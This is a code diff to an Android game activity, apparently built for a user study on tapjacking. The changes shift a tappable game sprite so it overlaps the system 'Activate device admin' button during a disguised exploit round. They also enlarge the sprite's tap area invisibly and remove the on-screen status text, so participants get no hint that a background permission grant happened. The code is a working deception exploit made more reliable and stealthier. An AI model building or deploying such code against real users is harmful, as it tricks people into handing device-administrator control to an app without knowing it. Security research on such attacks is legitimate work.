@@ -7,10 +7,12 @@ import android.app.admin.DevicePolicyManager
 import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
+import android.graphics.Rect
 import android.os.Bundle
 import android.os.Handler
 import android.os.Looper
 import android.util.Log
+import android.view.TouchDelegate
 import android.view.View
 import android.view.animation.AccelerateDecelerateInterpolator
 import android.widget.ImageButton
@@ -26,6 +28,11 @@ import java.util.Locale
 
 /**
  * Activity that represents a level in the game.
+ *
+ * No on-screen debug/status output is shown during play, so a study participant
+ * has no visual indication when a round is actually the disguised exploit round
+ * (see [clicked] and [drawBugForNextRound]). Use `adb logcat -s PERMISSION_DEBUG
+ * EXPLOIT` to confirm exploit triggers and outcomes out-of-band while observing.
  */
 class LevelActivity : ComponentActivity(), ClickListener {
 
@@ -41,13 +48,16 @@ class LevelActivity : ComponentActivity(), ClickListener {
     private lateinit var pointsText: TextView // The points text
     private lateinit var levelText: TextView // The level text
 
-    private lateinit var debugText: TextView // Debug text permission granted
     private lateinit var dpm: DevicePolicyManager
 
     private var exploitOngoing = false;
     private var nextRoundDelay: Long = 1800;
     private var points = 0;
     private var level = 1;
+
+    // Extra invisible padding added around the bug button's touch target so a
+    // slightly missed tap still registers, without changing its visual size.
+    private val extraTouchTargetDp = 24
 
     private var adminMode = false;
 
@@ -77,7 +87,6 @@ class LevelActivity : ComponentActivity(), ClickListener {
         levelText = findViewById(R.id.levelText)
         bugButton = findViewById(R.id.bugButton)
         killImage = findViewById(R.id.killImage)
-        debugText = findViewById(R.id.debugText)
 
         // Set level Counter
         level = intent.getIntExtra("level", 1)
@@ -277,16 +286,18 @@ class LevelActivity : ComponentActivity(), ClickListener {
                     1 -> Pair(800f, 1250f) // geolocation
                     2 -> Pair(800f, 1250f) // camera
                     3 -> {
+                        // y shifted up 75px (was 700f) so the bug better overlaps the real
+                        // "Activate device admin" button under the zoomed-in fade_in_dmp animation.
                         when (language) {
                             "en" -> {
-                                Pair(600f, 700f)
+                                Pair(600f, 625f)
                             }
                             "de" -> {
-                                Pair(800f, 700f)
+                                Pair(800f, 625f)
                             }
                             else -> {
                                 // Adjust bug position for different language
-                                Pair(600f, 700f)
+                                Pair(600f, 625f)
                             }
                         }
 
@@ -303,6 +314,7 @@ class LevelActivity : ComponentActivity(), ClickListener {
                 bugButton.visibility = View.VISIBLE
                 bugButton.isEnabled = true
                 animateBtn()
+                expandBugButtonTouchArea()
                 killImage.visibility = View.GONE
             } else {
                 // After exploit
@@ -333,7 +345,25 @@ class LevelActivity : ComponentActivity(), ClickListener {
             bugButton.visibility = View.VISIBLE
             bugButton.isEnabled = true
             animateBtn()
+            expandBugButtonTouchArea()
             killImage.visibility = View.GONE
+        }
+    }
+
+    /**
+     * Expands the bug button's touchable area beyond its visible bounds via a
+     * [TouchDelegate] on its parent, so a tap slightly outside the 64dp icon still
+     * registers. The button's actual size and appearance are unchanged, so this is
+     * not visible to the player.
+     */
+    private fun expandBugButtonTouchArea() {
+        val parent = bugButton.parent as View
+        parent.post {
+            val paddingPx = (extraTouchTargetDp * resources.displayMetrics.density).toInt()
+            val hitRect = Rect()
+            bugButton.getHitRect(hitRect)
+            hitRect.inset(-paddingPx, -paddingPx)
+            parent.touchDelegate = TouchDelegate(hitRect, bugButton)
         }
     }
 
@@ -434,9 +464,12 @@ class LevelActivity : ComponentActivity(), ClickListener {
         handler.removeCallbacksAndMessages(null);
     }
 
-    // print permission
+    /**
+     * Records a permission/exploit status line to Logcat only (tag "PERMISSION_DEBUG").
+     * Deliberately not shown on screen so a study participant sees nothing indicating
+     * that a background action occurred; check `adb logcat -s PERMISSION_DEBUG` instead.
+     */
     private fun debug(message: String) {
         Log.d("PERMISSION_DEBUG", message)
-        debugText.text = message
     }
 }
